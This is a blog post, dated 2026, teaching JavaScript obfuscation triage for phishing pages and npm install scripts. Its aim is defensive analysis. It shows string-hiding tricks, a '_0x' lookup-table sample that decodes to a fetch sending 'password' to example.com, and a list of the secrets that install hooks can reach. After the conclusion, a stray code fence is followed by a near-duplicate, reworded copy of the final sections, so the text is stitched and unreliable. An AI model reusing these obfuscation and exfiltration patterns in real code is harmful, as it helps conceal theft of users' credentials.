+++
title = "JavaScript Obfuscation: From Party Trick to Phishing Kit"
date = "2026-08-27"
+++

When I first started triaging phishing pages, what I really wanted was a practical field guide to JavaScript obfuscation — something that actually broke down what the tricks look like and how you actually get past them, instead of vague hand-waving. The core insight worth internalizing is that obfuscation isn't one big monolithic technique you either know or don't. It's a pile of small, individually simple tricks stacked on top of each other until the actual behavior disappears underneath the ceremony. And the way you beat it is genuinely kind of boring, on purpose.

## Getting the vocabulary straight

Minification just shortens identifiers and strips whitespace. Packing compresses or encodes code and rebuilds it at runtime. Encoding hides strings until something decodes them; encryption does the same thing but gates it behind a key. Anti-analysis is the category aimed squarely at the person doing the analysis — punishing them or feeding them false leads. Obfuscation itself is the umbrella term for any transformation that keeps the code's behavior intact while burying its intent.

Worth remembering that none of this is inherently malicious. Plenty of legitimate reasons exist to obfuscate — performance bundling, protecting IP, making tampering harder. But in triage work, the uses you actually run into skew heavily toward the bad kind: phishing pages exfiltrating credentials, malware loaders, malicious browser extensions, compromised npm install scripts, hacked website injections, fake CAPTCHA and update prompts.

## The tricks themselves, with real examples

**Hiding strings.** All five of these lines evaluate to the exact same string, "eval":

```js
'e'+"va"+'l'
"\x65\x76\x61\x6c"
String.fromCharCode(101, 118, 97, 108)
atob('ZXZhbA==')
"\u0065\u0076\u0061\u006C"
```

**Lookup tables.** Identifiers that start with `_0x` are about as classic a tell as you'll find in this business:

```js
const _0x1234 = ["fetch", "password", "https://example.com"];
_0xabc = (i) => { return _0x1234[i - 0x10]; }
\u0065\u0076\u0061\u006C(`${_0xabc(16)}("${_0xabc(18)}?${_0xabc(17)}")`)
```

Rename the identifiers to something meaningful and manually collapse the lookups, and this reduces down to `eval(fetch("https://example.com?password"))`. Modern IDEs make the renaming step a lot less error-prone than it used to be, and AI tools are genuinely good at chewing through small blocks like this one.

**Dynamic property access.** `window.document.cookie`, `window["document"].cookie`, `window["doc"+"ument"]["coo"+"kie"]` — three ways of writing the exact same access, all specifically chosen to dodge a plain text search for "cookie" or "document".

**Dead code and noise.** Fake branches that will never actually execute, unused functions given dramatic-sounding names, arithmetic that computes nothing meaningful, bogus conditionals, and random strings dressed up to look like domains or API keys. None of it does anything. Its only job is to make you scroll longer and doubt yourself more.

## A workflow that actually holds up

Here's the process, distilled:

```text
1. Preserve the original.
2. Make a safe working copy.
3. Beautify only as a first pass.
4. Extract strings.
5. Identify execution sinks.
6. Capture generated payloads.
7. Observe behavior in a controlled environment.
8. Repeat until the code stops hiding behind ceremony.
```

It's worth being clear that beautifying is not the same thing as deobfuscating. Tools like Biome or Prettier will restore sane indentation, but they can't give you back meaningful variable names, recover the author's intent, or decode a runtime string. The move that actually works is finding the unpacking step, capturing what it spits out, swapping in a logging call at the execution sink, decoding whatever the next layer turns out to be, and repeating that until there's nothing left to unwrap.

## Why npm changes the calculus

When the victim isn't a browser tab but a build pipeline, the stakes shift considerably. Package scripts run automatically during install, which means preinstall, postinstall, build hooks, and test scripts all become convenient hiding places. In a Node environment, obfuscated JavaScript has a much bigger blast radius — `process.env`, the filesystem, child processes, home directories, npm tokens, GitHub tokens, SSH keys, CI environment variables, all of it reachable. The question "what does it read?" stops being about cookies and form fields and starts being about whatever secrets happened to be lying around on the build runner.

## The bottom line

The safety note buried in all of this deserves repeating on its own: treat every sample as hostile by default, always work off a copy, and never run unknown JavaScript anywhere near credentials, clipboard contents, an active SSH agent, or cloud tokens. That caution extends to AI-assisted analysis too — AI tools are genuinely useful for chewing through isolated snippets or already-decoded artifacts, but they are not a sandbox, and they're not a source of forensic evidence.

The questions that consistently work are the unglamorous ones: what does this read, what does it write, where does it try to connect, what code does it generate on the fly, what conditions change its behavior, and what actually happens to a real user or a real build runner if this runs unopposed. Obfuscation is built to make you improvise and stare helplessly at weird-looking fragments. A repeatable workflow turns that mess into a series of small, bounded jobs — and every one of those jobs is, eventually, decodable.```

Beautifying is not deobfuscation. Biome or Prettier restore indentation, but they cannot restore variable names, recover intent, or decode runtime strings. The usual move is to find the unpacking step and capture what comes out. Replace the execution sink, log the payload, decode the next layer, keep going.

## The npm difference

When the browser is not the victim, the stakes change. Package scripts run during install, so preinstall, postinstall, build hooks, and test scripts become hiding places. In Node, obfuscated JavaScript can reach `process.env`, the file system, child processes, home directories, npm tokens, GitHub tokens, SSH keys, and CI variables. "What does it read?" stops meaning cookies and form fields, and starts meaning "what secrets did the build runner have lying around?"

## Conclusion

The safety note in the post is worth repeating: assume the sample is hostile, work on a copy, and do not run unknown JavaScript where credentials, clipboard contents, SSH agents, or cloud tokens are available. That includes AI-assisted analysis. AI tools are useful for isolated snippets and decoded artifacts, but they are not a sandbox and not an evidence source.

The questions that work are the boring ones: what does it read, what does it write, where does it connect, what code does it generate, what conditions change its behavior, what happens to a real user or build runner. Obfuscation wants you to improvise and stare at weird bits. A repeatable workflow turns the mess into smaller jobs, and each job is decodable.
